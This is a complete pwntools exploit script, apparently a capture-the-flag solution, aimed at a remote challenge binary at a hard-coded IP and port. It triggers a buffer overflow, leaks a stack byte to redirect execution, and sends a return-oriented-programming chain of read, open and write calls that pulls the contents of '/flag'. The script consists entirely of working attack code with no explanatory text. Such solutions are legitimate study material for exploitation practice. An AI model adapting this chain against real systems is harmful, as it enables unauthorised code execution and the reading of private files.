from pwn import *

io=remote('101.200.53.148',15324)
#io=process('./pwn')
p=ELF('./pwn')

a=list(p.search('\xb8\x01\x01\x00\x00\x0f\x05'))
a=[hex(i) for i in a]
print(a)

libc=ELF('./libc-2.23.so')
print(hex(libc.sym['open']))

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
code='${@$}@&$'
io.sendline(code)
for i in range(0x3ff):
	io.send('a')

io.send(p8(0x0))

io.recvuntil('running....\n')

stack=u8(io.recv(8))
io.send(p8(stack+0x58))

pop_rdi=0x04047ba
pop_rdx=0x40437f
pop_rsi=0x407578
fopen=0x052A540
read=0x52A670
write=0x52A710
bss=0x05D5690


io.recvuntil('continue?')
io.send('y')
pl=p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x100)+p64(read)
pl+=p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(fopen)
pl+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x100)+p64(read)
pl+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x100)+p64(write)
pl+='${@$}@&$'

io.sendline(pl)


for i in range(0x3f4):
	io.send('a')
io.send(p8(stack))
io.recvuntil('continue?')
io.send('n')
io.send('/flag\x00')

#pause()


#gdb.attach(io)



io.interactive()
